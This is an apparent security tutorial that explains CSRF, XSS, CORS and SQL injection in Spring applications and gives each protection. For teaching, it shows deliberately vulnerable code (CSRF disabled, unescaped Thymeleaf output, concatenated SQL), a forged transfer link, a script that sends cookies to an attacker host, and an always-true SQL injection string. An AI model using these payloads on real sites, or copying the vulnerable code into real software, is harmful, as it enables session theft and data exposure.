Common Web Attacks: CSRF, XSS, CORS and SQL Injection

Before Spring Security: what each attack does, a small demo of how it works, and how to protect against it.

1. CSRF (Cross-Site Request Forgery)

  • The user is already authenticated to a site.
  • A CSRF attack tricks the browser into making an unwanted request to that site, where the user is already logged in; the browser automatically attaches the session cookie.
  • Applicable where state and session are managed (cookie-based, stateful authentication).

Demo setup: authentication is mandatory for all endpoints, using session-based (stateful) authentication with a form login. (CSRF protection is switched off here so the attack can be shown; Spring Security turns it on by default.)

@Configuration
@EnableWebSecurity
public class SecurityConfig {
    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http.sessionManagement(session -> session.sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED))
            .csrf(csrf -> csrf.disable())                              // demo only
            .authorizeHttpRequests(auth -> auth.anyRequest().authenticated())
            .formLogin(Customizer.withDefaults());
        return http.build();
    }
}

@RestController
public class BankController {
    @GetMapping("/transfer")
    public String transfer(@RequestParam String amount, @RequestParam String to) {
        return "transferred " + amount + " to " + to;
    }
    @GetMapping("/")
    public String home() { return "hello"; }
}

(A real application must never change state with a GET request; /transfer is a GET here only because it makes the demo a one-link attack. With POST the attacker uses a hidden form that auto-submits, and the result is the same without CSRF protection.)

  1. Step 1: the user logs in to the server (the default "Please sign in" form at /login), so the browser holds the session cookie.
  2. Step 2: an attacker sends this user a malicious page or link:
<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>CSRF Attack Demo</title></head>
<body>
  <h2>Click Below to Claim Your Reward!</h2>
  <a href="http://localhost:8080/transfer?amount=1000&to=attacker">
     <button>Claim My Money</button>
  </a>
</body>
</html>

As soon as the user clicks "Claim My Money", the unwanted operation is executed, and the browser appends the cookies (the session) to that request, so the server believes the user did it.

How to protect from CSRF:

  • Use a CSRF token. It ensures the request originates from the legitimate source: the real forms/pages of the site include the token in the request, and the server validates it against the token it created when the HTTP session was created. A forged request from another site does not know the token.
  • In Spring Security it is on by default for state-changing requests (POST, PUT, DELETE). For pure stateless token-based APIs (JWT in a header) it is commonly disabled, because the browser does not attach the token automatically.
  • Additionally: SameSite cookies (Lax/Strict).

2. XSS (Cross-Site Scripting)

  • It allows an attacker to put a malicious script into a web page viewed by other users, for example a comments section.
  • Commonly used for stealing the session or defacing the website.

Demo: two endpoints:

  • GET /xss loads all the comments. It returns "xss"; since this is a @Controller (not @RestController), it by default looks for xss.html and renders it.
  • POST /comment does not sanitise user input; it simply stores the comment (here in a list, in a real app the DB) and displays it on the GET call.

So if an attacker posts a malicious script, then on every GET the script runs for every user who opens the page.

@Controller
public class XssController {
    private final List<String> comments = new ArrayList<>();

    @GetMapping("/xss")
    public String xss(Model model) {
        model.addAttribute("comments", comments);
        return "xss";
    }

    @PostMapping("/comment")
    public String addComment(@RequestParam String comment) {
        comments.add(comment);
        return "redirect:/xss";
    }
}
src/main/resources/templates/xss.html
<!DOCTYPE html>
<html xmlns:th="http://www.thymeleaf.org">
<head><title>XSS Demo</title></head>
<body>
  <h2>Leave a Comment</h2>
  <form action="/comment" method="post">
    <input type="text" name="comment" required>
    <button type="submit">Submit</button>
  </form>
  <h3>Comments:</h3>
  <ul>
    <li th:each="comment : ${comments}" th:utext="${comment}"></li>
  </ul>
</body>
</html>

The vulnerable part is th:utext (unescaped text): it inserts the comment as raw HTML. With th:text, Thymeleaf escapes it and the attack shows only as harmless text.

Now insert <script>alert("XSS Attack")</script> and submit: the script is stored, and when the GET API runs it is returned in the response and the browser executes it (a popup appears for every visitor). A real attacker would add:

<script>
  fetch('http://attacker-site/steal?cookie=' + document.cookie);
</script>

Then any user who loads the comment page sends their cookie to the attacker's URL. That cookie holds the JSESSIONID, which the attacker can use to perform unwanted operations on that active session. (Servers normally mark the session cookie HttpOnly, which hides it from document.cookie; that is one more reason to keep that flag on. XSS can still act on the user's behalf from inside the page.)

How to protect from XSS:

  • Escape user input when rendering (convert special characters like < to &lt;); template engines do this by default, so avoid raw/unescaped output.
  • Validate the data properly before storing and rendering it.
  • Add a Content-Security-Policy header and HttpOnly cookies.

3. CORS (Cross-Origin Resource Sharing)

It is not an attack; it is a browser security feature that restricts web pages from making requests to a different origin, unless the server allows it.

Origin = protocol + domain + port.

ClientServerSame origin?
https://localhost:8080http://localhost:8080No: different protocol
https://localhost:9090https://localhost:8080No: different port
https://sub.localhost:9090https://localhost:9090No: different domain (subdomain)

By default, if the client tries to call a server of a different origin, the browser blocks the response. So whenever there is a call between different origins, the server has to allow it by setting the Access-Control-Allow-Origin and related headers.

@Configuration
@EnableWebSecurity
public class SecurityConfig {
    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http.sessionManagement(session -> session.sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED))
            .authorizeHttpRequests(auth -> auth.anyRequest().authenticated())
            .cors(cors -> cors.configurationSource(request -> {
                CorsConfiguration config = new CorsConfiguration();
                config.setAllowedOrigins(List.of("https://sub.localhost:9090"));
                config.setAllowedMethods(List.of("GET", "POST", "PUT", "DELETE"));
                config.setAllowedHeaders(List.of("*"));
                return config;
            }))
            .formLogin(Customizer.withDefaults());
        return http.build();
    }
}

Outside Spring Security you can also use @CrossOrigin(origins = "...") on a controller or a global WebMvcConfigurer.addCorsMappings.

Good to know
  • CORS is enforced by the browser, not the server; tools like curl or Postman ignore it. It protects the user, not the API.
  • For non-simple requests the browser first sends a preflight OPTIONS request asking which methods/headers are allowed.
  • Never combine allowCredentials(true) with a wildcard origin; list the exact origins.

4. SQL Injection

The attacker manipulates the SQL query by inserting malicious input into a user-supplied field.

@GetMapping("/find")
public List<UserDetails> find(@RequestParam String name) {
    return userDetailsService.findByName(name);
}

public List<UserDetails> findByName(String name) {
    String sql = "SELECT * FROM user_details WHERE user_name = '" + name + "'";     // string concatenation
    return entityManager.createNativeQuery(sql, UserDetails.class).getResultList();
}

The table holds two rows (AA, BB). Calling /find?name=AA returns just AA. But calling:

/find?name=' OR '1' = '1

makes the query ... WHERE user_name = '' OR '1' = '1', which is always true, and all rows are returned. With other payloads an attacker could read other tables or modify data.

How to protect from SQL injection: use a parameterized query:

public List<UserDetails> findByName(String name) {
    String sql = "SELECT * FROM user_details WHERE user_name = :name";
    return entityManager.createNativeQuery(sql, UserDetails.class)
                        .setParameter("name", name)
                        .getResultList();
}

Now the same malicious string is treated purely as a value, so it searches for a user literally named ' OR '1' = '1 and returns nothing. Spring Data derived queries, JPQL with @Param and JdbcTemplate placeholders (?) are all safe in the same way.

Interview corner
What is CSRF and how does Spring protect against it?

A forged request riding on the victim's authenticated session cookie. Spring Security issues a per-session CSRF token that must accompany state-changing requests.

Do JWT-based stateless APIs need CSRF protection?

Usually not, since the token is sent explicitly in the Authorization header and not auto-attached by the browser. If the JWT is stored in a cookie, CSRF becomes relevant again.

Stored vs reflected XSS?

Stored: the script is saved (comments) and hits every viewer. Reflected: it comes from a crafted URL and echoes back in one response. Defence: output escaping, validation, CSP.

Same-origin policy and CORS: who enforces them?

The browser. The server only declares what origins it allows through CORS headers.

How do you prevent SQL injection?

Parameterized queries / prepared statements, ORM bindings, never concatenating input into SQL; least-privilege DB accounts.
